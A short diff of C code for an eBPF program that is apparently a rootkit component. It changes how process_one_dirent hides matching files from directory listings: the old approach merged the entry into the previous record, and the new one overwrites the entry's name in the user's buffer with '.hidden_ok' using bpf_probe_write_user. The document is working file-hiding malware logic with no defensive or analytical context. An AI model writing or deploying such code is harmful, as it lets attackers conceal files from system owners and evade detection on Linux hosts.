@@ -161,12 +161,26 @@ static long process_one_dirent(__u32 index, void *ctx)
 	bpf_probe_read_user_str(name, sizeof(name),
 				(void *)(cur + DIRENT_NAME_OFF));
 
-	if (should_hide(name, c->cfg)) {
-		bpf_printk("RK iter=%u: HIT name=%s prev=%llu reclen=%u\n",
-			   c->iters, name, (unsigned long long)c->prev, reclen);
-		c->write_rc = swallow_into_prev(c->prev, reclen);
-		bpf_printk("RK iter=%u: write_rc=%ld (prev=%llu)\n",
-			   c->iters, c->write_rc, (unsigned long long)c->prev);
+		if (should_hide(name, c->cfg)) {
+		/* Hide-by-rename: overwrite the target's own d_name with a
+		 * benign replacement. Works even when the target is the first
+		 * record in the buffer (no prev to merge into). */
+		const char *fake = ".hidden_ok";
+		int flen = 10;  /* strlen(".hidden_ok") */
+
+		bpf_printk("RK iter=%u: HIT name=%s reclen=%u\n",
+			   c->iters, name, reclen);
+
+		if (reclen < DIRENT_NAME_OFF + flen + 1) {
+			bpf_printk("RK iter=%u: reclen too small (%u < %d), skip\n",
+				   c->iters, reclen, DIRENT_NAME_OFF + flen + 1);
+		} else {
+			c->write_rc = bpf_probe_write_user(
+				(void *)(cur + DIRENT_NAME_OFF),
+				(void *)fake, flen + 1);
+			bpf_printk("RK iter=%u: rewrite rc=%ld\n",
+				   c->iters, c->write_rc);
+		}
 	} else {
 		c->prev = cur;
 	}
